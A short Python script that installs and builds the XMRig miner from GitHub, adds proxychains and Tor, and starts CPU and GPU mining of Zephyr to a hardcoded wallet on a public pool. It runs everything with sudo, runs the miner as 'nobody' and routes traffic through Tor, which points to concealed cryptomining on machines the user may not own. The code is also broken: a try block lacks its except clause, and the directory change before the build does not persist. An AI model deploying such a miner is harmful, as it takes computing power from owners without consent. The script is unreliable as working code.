import subprocess

def install_dependencies():
	subprocess.call("sudo apt-get update", shell=True)
	subprocess.call("sudo apt-get install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev", shell=True)

def set_max_huge_pages():
	try:
		# Get the total number of huge pages available
		total_huge_pages = int(subprocess.check_output(['cat', '/proc/meminfo']).decode().split('HugePages_Total:')[1].split()[0])
		# Set the number of huge pages to the maximum available
		subprocess.run(['sysctl', '-w', f'vm.nr_hugepages={total_huge_pages}'])

def install_xmrig():
	subprocess.call("git clone https://github.com/xmrig/xmrig.git", shell=True)
	subprocess.call("mkdir xmrig/build && cd xmrig/build", shell=True)
	subprocess.call("cmake .. && make -j$(nproc)", shell=True)

def install_proxychains():
	subprocess.call("sudo apt-get install -y proxychains", shell=True)

def install_tor():
	subprocess.call("sudo apt-get install -y tor", shell=True)

def start_mining():
	subprocess.Popen("sudo -u nobody proxychains tor -f /etc/tor/torrc && sudo -u nobody proxychains ./xmrig/build/xmrig --cpu -o sg-zephyr.miningocean.org:5432 -u ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB -k --tls", shell=True)
	subprocess.Popen("sudo -u nobody ./xmrig/build/xmrig --cuda -o sg-zephyr.miningocean.org:5432 -u ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB -k --tls", shell=True)

if __name__ == "__main__":
	install_dependencies()
	set_max_huge_pages()
	install_xmrig()
	install_proxychains()
	install_tor()
	start_mining()
